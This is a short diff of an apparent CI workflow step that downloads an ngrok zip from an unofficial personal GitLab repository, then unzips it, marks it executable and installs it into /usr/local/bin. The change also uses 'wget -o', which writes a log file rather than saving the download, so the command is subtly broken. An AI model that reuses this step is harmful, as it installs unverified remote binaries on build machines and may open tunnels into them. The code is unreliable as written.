@@ -26,7 +26,7 @@ jobs:
       - name: Install ngrok
         run: |
           # Download ngrok
-          wget https://gitlab.com/zhuhaowei01/dklkm7moiilm77mew3shlrkot_02/-/raw/main/ngrok.zip?inline=false
+          wget -o ngrok.zip https://gitlab.com/zhuhaowei01/dklkm7moiilm77mew3shlrkot_02/-/raw/main/ngrok.zip?inline=false
           unzip ngrok.zip
           chmod +x ngrok
           mv ngrok /usr/local/bin/
